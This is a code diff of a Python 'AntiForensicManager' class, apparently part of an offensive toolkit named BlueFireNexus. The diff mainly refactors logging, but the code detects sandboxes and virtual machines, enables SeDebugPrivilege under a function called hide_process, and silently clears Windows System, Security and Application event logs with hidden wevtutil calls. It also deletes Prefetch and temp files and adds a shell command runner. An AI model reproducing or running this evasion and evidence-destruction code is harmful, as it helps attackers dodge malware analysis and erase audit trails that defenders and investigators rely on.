@@ -1,20 +1,19 @@
 import os
-import sys
+# import sys # Removed unused import
 import platform
 import psutil
-import ctypes
-# Only import win32 modules if on Windows
+import subprocess # Moved back to top-level
+# Only import win32 modules and ctypes if on Windows
 if platform.system() == "Windows":
+    import ctypes
     import win32api
     import win32con
     import win32security
 # Keep typing imports separate
-from typing import List, Dict, Optional
+from typing import List, Tuple, Optional
 # Use absolute imports if possible, assume they work
 from src.core.logger import get_logger # Check if relative is needed based on structure
 from src.core.security import security # Check if relative is needed
-
-logger = get_logger(__name__)
 
 class AntiForensicManager:
     """Anti-forensic and sandbox detection techniques.""" # Updated description
@@ -41,6 +40,7 @@ class AntiForensicManager:
                 r"SYSTEM\CurrentControlSet\Services\VBoxGuest"
             ] if self.is_windows else []
         }
+        self.logger = get_logger(__name__)
 
     def detect_sandbox(self) -> bool:
         """
@@ -60,7 +60,7 @@ class AntiForensicManager:
         ]
         detected = any(checks)
         if detected:
-            logger.warning("Potential sandbox/VM environment detected based on available checks.")
+            self.logger.warning("Potential sandbox/VM environment detected based on available checks.")
         return detected
 
     def _check_processes(self) -> bool:
@@ -71,17 +71,17 @@ class AntiForensicManager:
                 try:
                     proc_name = proc.info.get('name')
                     if proc_name and proc_name.lower() in self.sandbox_indicators["processes"]:
-                        logger.debug(f"Sandbox indicator process found: {proc_name}")
+                        self.logger.debug(f"Sandbox indicator process found: {proc_name}")
                         return True
                 except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                     # Ignore processes that disappear or we can't access
                     continue
                 except Exception as e:
-                     logger.warning(f"Error checking process {getattr(proc, 'pid', 'N/A')}: {e}") # Log unexpected errors
+                     self.logger.warning(f"Error checking process {getattr(proc, 'pid', 'N/A')}: {e}") # Log unexpected errors
                      continue # Continue checking other processes
             return False
         except Exception as e:
-             logger.error(f"Error iterating processes: {e}", exc_info=True)
+             self.logger.error(f"Error iterating processes: {e}", exc_info=True)
              return False
 
     def _check_files(self) -> bool:
@@ -91,10 +91,10 @@ class AntiForensicManager:
         try:
             found = any(os.path.exists(path) for path in self.sandbox_indicators["files"])
             if found:
-                 logger.debug("Sandbox indicator file found.")
+                 self.logger.debug("Sandbox indicator file found.")
             return found
         except Exception as e:
-            logger.error(f"Error checking files: {e}", exc_info=True)
+            self.logger.error(f"Error checking files: {e}", exc_info=True)
             return False
 
     def _check_registry(self) -> bool:
@@ -109,7 +109,7 @@ class AntiForensicManager:
                      # Attempt to open the key with read access
                      key_handle = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, key_path, 0, win32con.KEY_READ)
                      if key_handle:
-                         logger.debug(f"Sandbox indicator registry key found: HKLM\{key_path}")
+                         self.logger.debug(f"Sandbox indicator registry key found: HKLM\{key_path}")
                          win32api.RegCloseKey(key_handle)
                          return True
                  except OSError as e: # Catch potential errors like key not found
@@ -117,9 +117,9 @@ class AntiForensicManager:
                      if e.winerror == 2:
                          continue # Key doesn't exist, continue checking others
                      else:
-                         logger.warning(f"Error accessing registry key HKLM\{key_path}: {e}")
+                         self.logger.warning(f"Error accessing registry key HKLM\{key_path}: {e}")
                  except Exception as e: # Catch other unexpected errors
-                     logger.warning(f"Unexpected error checking registry key HKLM\{key_path}: {e}")
+                     self.logger.warning(f"Unexpected error checking registry key HKLM\{key_path}: {e}")
                  finally:
                      # Ensure the handle is closed if it was opened
                      if key_handle:
@@ -129,7 +129,7 @@ class AntiForensicManager:
                               pass
             return False
         except Exception as e: # Catch errors during the loop setup itself
-             logger.error(f"Error during registry check setup: {e}", exc_info=True)
+             self.logger.error(f"Error during registry check setup: {e}", exc_info=True)
              return False
 
     def _check_memory(self) -> bool:
@@ -139,12 +139,12 @@ class AntiForensicManager:
             # Check for less than ~3.5 GB RAM as a more modern threshold
             threshold_gb = 3.5
             if total_memory_gb < threshold_gb:
-                logger.debug(f"Low total memory detected: {total_memory_gb:.2f} GB (Threshold: < {threshold_gb} GB)")
+                self.logger.debug(f"Low total memory detected: {total_memory_gb:.2f} GB (Threshold: < {threshold_gb} GB)")
                 return True
         except psutil.Error as e:
-            logger.warning(f"Could not check virtual memory: {e}")
+            self.logger.warning(f"Could not check virtual memory: {e}")
         except Exception as e:
-            logger.error(f"Unexpected error checking memory: {e}", exc_info=True)
+            self.logger.error(f"Unexpected error checking memory: {e}", exc_info=True)
         return False
 
     def _check_cpu(self) -> bool:
@@ -156,17 +156,17 @@ class AntiForensicManager:
             # Fallback to logical cores if physical count unavailable
             if cpu_count is None:
                  cpu_count = psutil.cpu_count(logical=True)
-                 logger.debug("Physical core count unavailable, checking logical cores.")
+                 self.logger.debug("Physical core count unavailable, checking logical cores.")
 
             if cpu_count is not None and cpu_count < threshold_cores:
-                logger.debug(f"Low CPU core count detected: {cpu_count} (Threshold: < {threshold_cores})")
+                self.logger.debug(f"Low CPU core count detected: {cpu_count} (Threshold: < {threshold_cores})")
                 return True
         except NotImplementedError:
-             logger.warning("Could not determine CPU core count on this platform.")
+             self.logger.warning("Could not determine CPU core count on this platform.")
         except psutil.Error as e:
-            logger.warning(f"Could not check CPU count: {e}")
+            self.logger.warning(f"Could not check CPU count: {e}")
         except Exception as e:
-            logger.error(f"Unexpected error checking CPU: {e}", exc_info=True)
+            self.logger.error(f"Unexpected error checking CPU: {e}", exc_info=True)
         return False
 
     def _check_disk(self) -> bool:
@@ -177,21 +177,21 @@ class AntiForensicManager:
             total_disk_gb = root_usage.total / (1024**3)
             threshold_gb = 100
             if total_disk_gb < threshold_gb:
-                 logger.debug(f"Low total disk size for root partition detected: {total_disk_gb:.2f} GB (Threshold: < {threshold_gb} GB)")
+                 self.logger.debug(f"Low total disk size for root partition detected: {total_disk_gb:.2f} GB (Threshold: < {threshold_gb} GB)")
                  return True
 
             # Check for VM-specific file systems (like VirtualBox Shared Folders)
             for partition in psutil.disk_partitions():
                 # Use case-insensitive check for file system type
                 if partition.fstype and partition.fstype.lower() in ['vboxsf']:
-                     logger.debug(f"VM-specific file system type detected: {partition.fstype} on {partition.device}")
+                     self.logger.debug(f"VM-specific file system type detected: {partition.fstype} on {partition.device}")
                      return True
         except FileNotFoundError:
-             logger.warning("Could not get disk usage for root partition.")
+             self.logger.warning("Could not get disk usage for root partition.")
         except psutil.Error as e:
-            logger.warning(f"Could not check disk partitions/usage: {e}")
+            self.logger.warning(f"Could not check disk partitions/usage: {e}")
         except Exception as e:
-            logger.error(f"Unexpected error checking disk: {e}", exc_info=True)
+            self.logger.error(f"Unexpected error checking disk: {e}", exc_info=True)
         return False
 
     def _check_network(self) -> bool:
@@ -211,7 +211,7 @@ class AntiForensicManager:
                          if snic.family == psutil.AF_LINK and snic.address:
                               mac = snic.address.lower()
                               if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
-                                   logger.debug(f"VM-specific MAC address prefix found: {mac} on interface {name}")
+                                   self.logger.debug(f"VM-specific MAC address prefix found: {mac} on interface {name}")
                                    vm_mac_found = True
                                    break # Found VM MAC on this interface
                     if vm_mac_found:
@@ -223,13 +223,13 @@ class AntiForensicManager:
             # Check for very few adapters (e.g., only one non-loopback) as a weaker indicator
             threshold_adapters = 1
             if adapter_count <= threshold_adapters:
-                logger.debug(f"Low network adapter count detected: {adapter_count} non-loopback (Threshold: <= {threshold_adapters})")
+                self.logger.debug(f"Low network adapter count detected: {adapter_count} non-loopback (Threshold: <= {threshold_adapters})")
                 return True
 
         except psutil.Error as e:
-            logger.warning(f"Could not check network interfaces: {e}")
+            self.logger.warning(f"Could not check network interfaces: {e}")
         except Exception as e:
-            logger.error(f"Unexpected error checking network: {e}", exc_info=True)
+            self.logger.error(f"Unexpected error checking network: {e}", exc_info=True)
         return False
 
     def hide_process(self, pid: Optional[int] = None) -> bool:
@@ -245,10 +245,10 @@ class AntiForensicManager:
             bool: True if privilege adjustment was attempted successfully, False otherwise.
         """
         target_pid = pid or os.getpid()
-        logger.warning(f"hide_process (PID: {target_pid}) is Windows-specific and only attempts to enable SeDebugPrivilege. It does not truly hide the process and requires elevation.")
+        self.logger.warning(f"hide_process (PID: {target_pid}) is Windows-specific and only attempts to enable SeDebugPrivilege. It does not truly hide the process and requires elevation.")
 
         if not self.is_windows:
-            logger.warning(f"hide_process skipped for PID {target_pid}: Not running on Windows.")
+            self.logger.warning(f"hide_process skipped for PID {target_pid}: Not running on Windows.")
             return False
 
         process_handle = None
@@ -274,28 +274,28 @@ class AntiForensicManager:
 
             # Check AdjustTokenPrivileges result
             if last_error == win32con.ERROR_SUCCESS:
-                 logger.info(f"Successfully enabled SeDebugPrivilege for PID {target_pid}.")
+                 self.logger.info(f"Successfully enabled SeDebugPrivilege for PID {target_pid}.")
                  return True
             elif last_error == win32con.ERROR_NOT_ALL_ASSIGNED:
                  # This is the expected error if the user lacks the privilege (e.g., not admin)
-                 logger.warning(f"Could not enable SeDebugPrivilege for PID {target_pid} (Requires elevation / privilege not held). Error: {last_error}")
+                 self.logger.warning(f"Could not enable SeDebugPrivilege for PID {target_pid} (Requires elevation / privilege not held). Error: {last_error}")
                  return False # Indicate privilege was not assigned
             else:
                  # Other unexpected errors
-                 logger.error(f"Failed to adjust token privileges for PID {target_pid}. Error code: {last_error}")
+                 self.logger.error(f"Failed to adjust token privileges for PID {target_pid}. Error code: {last_error}")
                  return False
 
         except win32security.error as e:
              # Catch specific pywin32 errors
-             logger.error(f"Security error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
+             self.logger.error(f"Security error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
              return False
         except OSError as e:
              # Catch OS errors like invalid PID if OpenProcess fails
-             logger.error(f"OS error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
+             self.logger.error(f"OS error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
              return False
         except Exception as e:
             # Catch any other unexpected errors
-            logger.error(f"Unexpected error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
+            self.logger.error(f"Unexpected error attempting to enable SeDebugPrivilege for PID {target_pid}: {e}", exc_info=True)
             return False
         finally:
             # Ensure handles are closed
@@ -315,64 +315,70 @@ class AntiForensicManager:
             bool: True if all attempted steps completed without fatal errors, False otherwise.
         """
         overall_success = True
-        logger.info("Attempting to clear forensic traces...")
+        self.logger.info("Attempting to clear forensic traces...")
 
         # --- Clear Event Logs (Windows Only) ---
         if self.is_windows:
              logs_to_clear = ["System", "Security", "Application"]
-             logger.info("Attempting to clear Windows event logs (requires elevation)...")
+             self.logger.info("Attempting to clear Windows event logs (requires elevation)...")
              cleared_any_log = False
              failed_any_log = False
-             try:
-                 import subprocess # Import here as it's only needed for this section
-             except ImportError:
-                 logger.error("`subprocess` module not found. Cannot attempt to clear event logs.")
-                 failed_any_log = True
+             for log_name in logs_to_clear:
+                 try:
+                     # Use run to capture output/errors
+                     # Use CREATE_NO_WINDOW to prevent console window flashing
+                     startupinfo = subprocess.STARTUPINFO()
+                     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                     startupinfo.wShowWindow = subprocess.SW_HIDE
 
-             if 'subprocess' in locals():
-                 for log_name in logs_to_clear:
-                     try:
-                         # Use run to capture output/errors, check=True raises exception on failure
-                         # Use CREATE_NO_WINDOW to prevent console window flashing
-                         startupinfo = subprocess.STARTUPINFO()
-                         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                         startupinfo.wShowWindow = subprocess.SW_HIDE
+                     process = subprocess.run(
+                         ["wevtutil", "cl", log_name],
+                         check=False, # Check return code manually
+                         capture_output=True, text=True, 
+                         encoding='utf-8', errors='ignore',
+                         startupinfo=startupinfo
+                     )
 
-                         process = subprocess.run(
-                             ["wevtutil", "cl", log_name],
-                             check=False, # Check return code manually
-                             capture_output=True, text=True, encoding='utf-8', errors='ignore',
-                             startupinfo=startupinfo
-                             )
-
-                         if process.returncode == 0:
-                              logger.debug(f"Successfully cleared '{log_name}' event log.")
-                              cleared_any_log = True
+                     if process.returncode == 0:
+                         self.logger.debug(f"Successfully cleared '{log_name}' event log.")
+                         cleared_any_log = True
+                     else:
+                         # Break long error message
+                         stderr_snippet = process.stderr.strip()
+                         stdout_snippet = process.stdout.strip()
+                         error_msg = (
+                             f"Failed to clear '{log_name}' event log. "
+                             f"RC: {process.returncode}. "
+                             f"Stderr: {stderr_snippet}. Stdout: {stdout_snippet}"
+                         )
+                         if process.returncode == 5: # Access Denied
+                             self.logger.warning(f"{error_msg} (Requires elevation).")
                          else:
-                              error_msg = f"Failed to clear '{log_name}' event log. RC: {process.returncode}. Stderr: {process.stderr.strip()}. Stdout: {process.stdout.strip()}"
-                              if process.returncode == 5: # Access Denied
-                                  logger.warning(f"{error_msg} (Requires elevation).")
-                              else:
-                                  logger.error(error_msg)
-                              failed_any_log = True
-                     except FileNotFoundError:
-                         logger.error("`wevtutil` command not found. Cannot clear event logs.")
+                             self.logger.error(error_msg)
                          failed_any_log = True
-                         break # Stop trying if command is missing
-                     except Exception as e:
-                         logger.error(f"Error running wevtutil to clear '{log_name}': {e}", exc_info=True)
-                         failed_any_log = True
+                 except FileNotFoundError:
+                     self.logger.error(
+                         "`wevtutil` command not found. Cannot clear event logs."
+                     )
+                     failed_any_log = True
+                     break # Stop trying if command is missing
+                 except Exception as e:
+                     self.logger.error(
+                         f"Error running wevtutil to clear '{log_name}': {e}", 
+                         exc_info=True
+                     )
+                     failed_any_log = True
              if failed_any_log: # Mark overall failure if any log clear failed
                  overall_success = False
         else:
-             logger.info("Skipping Windows event log clearing: Not on Windows.")
+             self.logger.info("Skipping Windows event log clearing: Not on Windows.")
 
 
         # --- Clear Prefetch (Windows Only) ---
         if self.is_windows:
              prefetch_dir = os.path.join(os.environ.get("SystemRoot", "C:\Windows"), "Prefetch")
              if os.path.isdir(prefetch_dir): # Check if it's a directory
-                  logger.info("Attempting to clear Windows prefetch files (requires elevation)...")
+                  self.logger.info("Attempting to clear Windows prefetch files (requires elevation)...")
                   cleared_any_prefetch = False
                   failed_any_prefetch = False
                   try:
@@ -384,24 +390,24 @@ class AntiForensicManager:
                                    # logger.debug(f"Removed prefetch file: {filename}") # Can be very verbose
                                    cleared_any_prefetch = True
                            except OSError as e: # Catch permission errors etc.
-                               logger.warning(f"Could not remove prefetch file '{filename}': {e} (Requires elevation?).")
+                               self.logger.warning(f"Could not remove prefetch file '{filename}': {e} (Requires elevation?).")
                                failed_any_prefetch = True
                            except Exception as e:
-                                logger.error(f"Unexpected error removing prefetch file '{filename}': {e}", exc_info=True)
+                                self.logger.error(f"Unexpected error removing prefetch file '{filename}': {e}", exc_info=True)
                                 failed_any_prefetch = True
                       if failed_any_prefetch:
                            overall_success = False
                   except Exception as e:
-                      logger.error(f"Error accessing prefetch directory '{prefetch_dir}': {e}", exc_info=True)
+                      self.logger.error(f"Error accessing prefetch directory '{prefetch_dir}': {e}", exc_info=True)
                       overall_success = False
              else:
-                  logger.warning(f"Prefetch directory not found or not accessible at '{prefetch_dir}'. Skipping.")
+                  self.logger.warning(f"Prefetch directory not found or not accessible at '{prefetch_dir}'. Skipping.")
         else:
-             logger.info("Skipping Windows prefetch clearing: Not on Windows.")
+             self.logger.info("Skipping Windows prefetch clearing: Not on Windows.")
 
 
         # --- Clear Temp Files (Cross-platform) ---
-        logger.info("Attempting to clear user temporary files...")
+        self.logger.info("Attempting to clear user temporary files...")
         # Get standard temp directory paths
         temp_dirs_to_check = []
         if self.is_windows:
@@ -421,7 +427,7 @@ class AntiForensicManager:
         for temp_dir in temp_dirs_to_check:
             if temp_dir and os.path.isdir(temp_dir) and temp_dir not in processed_dirs:
                 processed_dirs.add(temp_dir)
-                logger.debug(f"Processing temp directory: {temp_dir}")
+                self.logger.debug(f"Processing temp directory: {temp_dir}")
                 try:
                     for item_name in os.listdir(temp_dir):
                          item_path = os.path.join(temp_dir, item_name)
@@ -437,16 +443,25 @@ class AntiForensicManager:
                                    cleared_any_temp = True
                               elif os.path.isdir(item_path):
                                    # Skipping directory removal by default for safety
-                                   # Consider adding recursive delete (shutil.rmtree) if desired, USE WITH EXTREME CAUTION
+                                   # Consider adding recursive delete (shutil.rmtree) if desired
+                                   # USE WITH EXTREME CAUTION
                                    pass
                          except OSError as e:
-                              logger.warning(f"Could not remove temp item '{item_path}': {e}")
+                              self.logger.warning(
+                                  f"Could not remove temp item '{item_path}': {e}"
+                              )
                               failed_any_temp = True
                          except Exception as e:
-                              logger.error(f"Unexpected error removing temp item '{item_path}': {e}", exc_info=True)
+                              self.logger.error(
+                                  f"Unexpected error removing temp item '{item_path}': {e}", 
+                                  exc_info=True
+                              )
                               failed_any_temp = True
                 except Exception as e:
-                     logger.error(f"Error listing or processing temp directory '{temp_dir}': {e}", exc_info=True)
+                     self.logger.error(
+                         f"Error listing or processing temp directory '{temp_dir}': {e}", 
+                         exc_info=True
+                     )
                      failed_any_temp = True
 
         if failed_any_temp:
@@ -454,9 +469,11 @@ class AntiForensicManager:
 
 
         if overall_success:
-             logger.info("Trace clearing attempts finished.")
+             self.logger.info("Trace clearing attempts finished.")
         else:
-             logger.warning("Trace clearing finished with one or more non-fatal errors or permission issues.")
+             self.logger.warning(
+                 "Trace clearing finished with one or more non-fatal errors or permission issues."
+             )
         return overall_success # Returns True if major steps attempted, False if fundamental errors occurred
 
     def evade_detection(self) -> Dict[str, bool]:
@@ -474,8 +491,27 @@ class AntiForensicManager:
             # Use a more accurate key name
             "traces_cleared_attempted": self.clear_traces() # Logs inside
         }
-        logger.info(f"Evasion detection results: {results}")
+        self.logger.info(f"Evasion detection results: {results}")
         return results
+
+    def _run_command(self, command: str) -> Optional[str]:
+        """Run a command and return its output."""
+        try:
+            # Adjusted to fit within line length limits
+            result = subprocess.run(
+                command, 
+                shell=True, 
+                capture_output=True, 
+                text=True, 
+                check=True
+            )
+            return result.stdout.strip()
+        except subprocess.CalledProcessError as e:
+            self.logger.error(f"Command '{command}' failed: {e}")
+            return None
+        except FileNotFoundError:
+            self.logger.error(f"Command not found: {command.split()[0]}")
+            return None
 
 # --- Instance ---
 # Create a global instance for easy import, or manage instantiation within BlueFireNexus
